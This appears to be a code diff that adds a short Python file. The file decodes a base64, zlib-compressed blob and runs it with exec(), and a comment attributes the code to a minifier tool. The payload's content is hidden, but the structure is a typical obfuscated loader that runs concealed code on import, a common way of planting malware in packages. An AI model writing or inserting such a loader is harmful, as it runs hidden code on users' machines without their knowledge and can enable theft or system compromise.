@@ -1,0 +1,3 @@
+import zlib, base64
+exec(zlib.decompress(base64.b64decode('eJx1UU1Lw0AQve+vGHpJAmVt8FaI53oQxOYmsizJpFnc7MSdbVHE/24mtdaCvWTD7Puat12kAfqURs0YDxjBDSPFBNvp9Lip68cnfNsjp40Nrce4lNF2hqpOuEzNK6ZLct1HtK0Luwf3fh/Uz5Q/+EghPgFHm/rTNbFqvGU+s89W+aXinxDFWkFrcaBg0ozhqo57VC12MFgXcgEQ66ZvXczFT08/wQ6YG9M5j8YUhQJJUE0BtY27w3P54jrwGPLTpLgrAT0j3K5WKwW2bWOVZ54a63vilC1dSLloiNa16vQYKVFD3ky52VGoFgK6KXW5UMCHWP23uXgtr0lK8ije3ULgExMEBBTgN9y8G3zK9wu01otiNju+t+kootgUalrZGCnGmKrKjJH2jMnWxxbVN/nXw4U=')))
+# Created by pyminifier (https://github.com/dzhuang/pyminifier3)
